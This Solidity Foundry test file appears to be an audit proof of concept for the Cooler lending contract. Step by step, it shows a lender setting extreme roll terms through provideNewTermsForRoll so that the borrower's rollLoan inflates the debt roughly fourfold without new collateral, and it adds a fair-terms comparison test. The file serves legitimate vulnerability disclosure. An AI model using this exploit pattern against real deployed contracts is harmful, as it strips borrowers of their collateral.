// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {MockGohm} from "test/mocks/MockGohm.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";

import {Cooler} from "src/Cooler.sol";
import {CoolerFactory} from "src/CoolerFactory.sol";

/**
 * @title ExploitTest - Malicious Lender Roll Terms Manipulation
 * @notice This test demonstrates a critical vulnerability where a malicious lender can
 *         manipulate loan terms during a roll operation to extract unfair value from borrowers.
 *
 * VULNERABILITY DESCRIPTION:
 * The `provideNewTermsForRoll` function allows lenders to set arbitrary terms for rolling a loan,
 * including extremely high interest rates and manipulated loan-to-collateral ratios. When a borrower
 * calls `rollLoan`, these malicious terms are applied without proper validation:
 *
 * 1. Lender sets extremely high interest rate (e.g., 10000000% APR)
 * 2. Lender sets very high loanToCollateral ratio to avoid requiring new collateral
 * 3. Borrower calls rollLoan, unknowingly accepting these terms
 * 4. Massive interest is added to loan.amount, making repayment economically infeasible
 * 5. Borrower is forced to default, losing all collateral
 *
 * ATTACK FLOW:
 * - Borrower requests loan: 1000 debt tokens for 100 collateral tokens
 * - Lender clears with fair terms: 5% interest, 1 year duration
 * - Expected repayment: 1050 debt tokens
 * - Lender calls provideNewTermsForRoll with malicious terms:
 *   * Interest rate: 3e18 (300% for the duration)
 *   * loanToCollateral: 1000e18 (extremely high to avoid new collateral requirement)
 * - Borrower calls rollLoan expecting reasonable terms
 * - New debt becomes: 1050 + (1050 * 300%) = 4200 debt tokens
 * - Borrower must now pay 4200 tokens to recover collateral worth only 1500
 * - Borrower is economically forced to default
 */
contract ExploitTest is Test {
    MockGohm internal collateral;
    MockERC20 internal debt;

    address owner;      // Borrower
    address lender;     // Malicious lender

    CoolerFactory internal coolerFactory;
    Cooler internal cooler;

    // Test parameters
    uint256 public constant DECIMALS = 1e18;
    uint256 public constant INITIAL_INTEREST_RATE = 5e16; // 5% annualized
    uint256 public constant INITIAL_LOAN_TO_COLLATERAL = 10 * 1e18; // 10 debt : 1 collateral
    uint256 public constant DURATION = 365 days; // 1 year

    function setUp() public {
        vm.warp(51 * 365 * 24 * 60 * 60); // Set timestamp at roughly Jan 1, 2021

        // Deploy mock tokens
        collateral = new MockGohm("Collateral", "COLLAT", 18);
        debt = new MockERC20("Debt", "DEBT", 18);

        // Create accounts
        owner = makeAddr("borrower");
        lender = makeAddr("lender");

        // Fund accounts
        // Borrower has 200 collateral tokens (enough for initial loan + potential roll collateral)
        deal(address(collateral), owner, 200 * DECIMALS);
        // Lender has 5000 debt tokens
        deal(address(debt), lender, 5000 * DECIMALS);

        // Deploy CoolerFactory and create a Cooler for the borrower
        coolerFactory = new CoolerFactory();
        vm.prank(owner);
        cooler = Cooler(coolerFactory.generateCooler(collateral, debt));
    }

    /**
     * @notice Test demonstrating the malicious lender roll terms manipulation exploit
     * @dev This test proves that a lender can set unfair terms via provideNewTermsForRoll
     *      and force the borrower into an economically unviable position
     */
    function testExploit_MaliciousLenderRollTermsManipulation() public {
        // ============================================================
        // STEP 1: Borrower requests a loan with fair terms
        // ============================================================
        uint256 loanAmount = 1000 * DECIMALS;
        uint256 requiredCollateral = (loanAmount * DECIMALS) / INITIAL_LOAN_TO_COLLATERAL;
        // requiredCollateral = 100 * DECIMALS

        vm.startPrank(owner);
        collateral.approve(address(cooler), requiredCollateral);
        uint256 reqID = cooler.requestLoan(
            loanAmount,
            INITIAL_INTEREST_RATE,
            INITIAL_LOAN_TO_COLLATERAL,
            DURATION
        );
        vm.stopPrank();

        console2.log("=== LOAN REQUEST ===");
        console2.log("Requested amount:", loanAmount / DECIMALS, "debt tokens");
        console2.log("Collateral pledged:", requiredCollateral / DECIMALS, "collateral tokens");
        console2.log("Interest rate:", INITIAL_INTEREST_RATE * 100 / DECIMALS, "%");

        // ============================================================
        // STEP 2: Lender clears the request with fair initial terms
        // ============================================================
        vm.startPrank(lender);
        debt.approve(address(cooler), loanAmount);
        uint256 loanID = cooler.clearRequest(reqID, false, false);
        vm.stopPrank();

        Cooler.Loan memory loan = cooler.getLoan(loanID);
        uint256 initialLoanAmount = loan.amount;

        console2.log("\n=== LOAN CLEARED ===");
        console2.log("Initial loan amount (principal + interest):", initialLoanAmount / DECIMALS, "debt tokens");
        console2.log("Expected repayment at 5% interest:", initialLoanAmount / DECIMALS, "debt tokens");

        // ============================================================
        // STEP 3: Malicious lender provides unfair roll terms
        // ============================================================
        // The lender sets:
        // - Extremely high interest rate: 3e18 (300% for the duration)
        // - Very high loanToCollateral: 1000e18 to ensure newCollateralFor returns 0
        uint256 maliciousInterestRate = 3e18; // 300% for the duration
        uint256 maliciousLoanToCollateral = 1000 * DECIMALS; // Very high ratio

        vm.prank(lender);
        cooler.provideNewTermsForRoll(
            loanID,
            maliciousInterestRate,
            maliciousLoanToCollateral,
            DURATION
        );

        console2.log("\n=== MALICIOUS ROLL TERMS SET ===");
        console2.log("Malicious interest rate:", maliciousInterestRate * 100 / DECIMALS, "% for duration");
        console2.log("Malicious loanToCollateral:", maliciousLoanToCollateral / DECIMALS);

        // Verify that newCollateralFor returns 0 due to manipulated loanToCollateral
        uint256 newCollateralRequired = cooler.newCollateralFor(loanID);
        console2.log("New collateral required:", newCollateralRequired);
        assertEq(newCollateralRequired, 0, "Lender manipulated terms to require 0 new collateral");

        // ============================================================
        // STEP 4: Borrower unknowingly rolls the loan with malicious terms
        // ============================================================
        // The borrower might call rollLoan thinking they're extending with reasonable terms
        // or not fully understanding the lender has changed the terms
        vm.prank(owner);
        cooler.rollLoan(loanID);

        // ============================================================
        // STEP 5: Verify the exploit - loan amount is now unfairly inflated
        // ============================================================
        Cooler.Loan memory loanAfterRoll = cooler.getLoan(loanID);
        uint256 finalLoanAmount = loanAfterRoll.amount;

        console2.log("\n=== AFTER ROLL (EXPLOIT SUCCESSFUL) ===");
        console2.log("Loan amount before roll:", initialLoanAmount / DECIMALS, "debt tokens");
        console2.log("Loan amount after roll:", finalLoanAmount / DECIMALS, "debt tokens");
        console2.log("Increase:", (finalLoanAmount - initialLoanAmount) / DECIMALS, "debt tokens");

        // Calculate expected malicious interest
        // interestFor(amount, rate, duration) = (amount * (rate * duration / 365 days)) / DECIMALS_INTEREST
        uint256 expectedMaliciousInterest = (initialLoanAmount * maliciousInterestRate) / DECIMALS;
        uint256 expectedFinalAmount = initialLoanAmount + expectedMaliciousInterest;

        console2.log("Expected final amount:", expectedFinalAmount / DECIMALS, "debt tokens");

        // Verify the exploit worked
        assertEq(finalLoanAmount, expectedFinalAmount, "Loan amount should include malicious interest");

        // The borrower now owes 4x the original amount
        // If collateral is worth $1500 and they need to pay back $4200 worth of debt tokens,
        // it's economically irrational to repay - they will default and lose collateral
        assertTrue(
            finalLoanAmount > initialLoanAmount * 3,
            "Exploit: Loan amount increased by more than 3x due to malicious terms"
        );

        console2.log("\n=== IMPACT ===");
        console2.log("Borrower expected to repay:", initialLoanAmount / DECIMALS, "debt tokens");
        console2.log("Borrower now must repay:", finalLoanAmount / DECIMALS, "debt tokens");
        console2.log("If collateral worth $1500 and debt tokens worth $1 each:");
        console2.log("  - Repaying costs: $", finalLoanAmount / DECIMALS);
        console2.log("  - Collateral value: $1500");
        console2.log("  - Borrower is forced to default and lose collateral");

        // Additional verification: collateral didn't increase despite massive debt increase
        assertEq(
            loanAfterRoll.collateral,
            loan.collateral,
            "Collateral should remain the same due to manipulated loanToCollateral ratio"
        );
    }

    /**
     * @notice Helper test showing the expected fair behavior for comparison
     * @dev This demonstrates what should happen with fair roll terms
     */
    function testComparison_FairRollTerms() public {
        // Setup: Create and clear a loan
        uint256 loanAmount = 1000 * DECIMALS;
        uint256 requiredCollateral = (loanAmount * DECIMALS) / INITIAL_LOAN_TO_COLLATERAL;

        vm.startPrank(owner);
        collateral.approve(address(cooler), requiredCollateral);
        uint256 reqID = cooler.requestLoan(
            loanAmount,
            INITIAL_INTEREST_RATE,
            INITIAL_LOAN_TO_COLLATERAL,
            DURATION
        );
        vm.stopPrank();

        vm.startPrank(lender);
        debt.approve(address(cooler), loanAmount);
        uint256 loanID = cooler.clearRequest(reqID, false, false);
        vm.stopPrank();

        Cooler.Loan memory loan = cooler.getLoan(loanID);
        uint256 initialLoanAmount = loan.amount;

        // Lender provides FAIR roll terms (same as original)
        vm.prank(lender);
        cooler.provideNewTermsForRoll(
            loanID,
            INITIAL_INTEREST_RATE,
            INITIAL_LOAN_TO_COLLATERAL,
            DURATION
        );

        // Check if new collateral is needed
        uint256 newCollateralRequired = cooler.newCollateralFor(loanID);

        // Approve new collateral if needed
        if (newCollateralRequired > 0) {
            vm.prank(owner);
            collateral.approve(address(cooler), newCollateralRequired);
        }

        // Borrower rolls the loan
        vm.prank(owner);
        cooler.rollLoan(loanID);

        Cooler.Loan memory loanAfterRoll = cooler.getLoan(loanID);
        uint256 finalLoanAmount = loanAfterRoll.amount;

        console2.log("\n=== FAIR ROLL COMPARISON ===");
        console2.log("Initial loan amount:", initialLoanAmount / DECIMALS);
        console2.log("Final loan amount:", finalLoanAmount / DECIMALS);
        console2.log("Increase:", (finalLoanAmount - initialLoanAmount) / DECIMALS);

        // With fair 5% terms, the increase should be reasonable
        // The increase should be approximately 5% of the initial amount
        uint256 fairIncrease = (initialLoanAmount * INITIAL_INTEREST_RATE) / DECIMALS;
        uint256 actualIncrease = finalLoanAmount - initialLoanAmount;

        // The increase should be close to the fair interest calculation
        assertApproxEqRel(
            actualIncrease,
            fairIncrease,
            0.01e18, // 1% tolerance
            "Fair roll should only add reasonable interest"
        );

        console2.log("This is economically reasonable for the borrower to repay");
    }
}
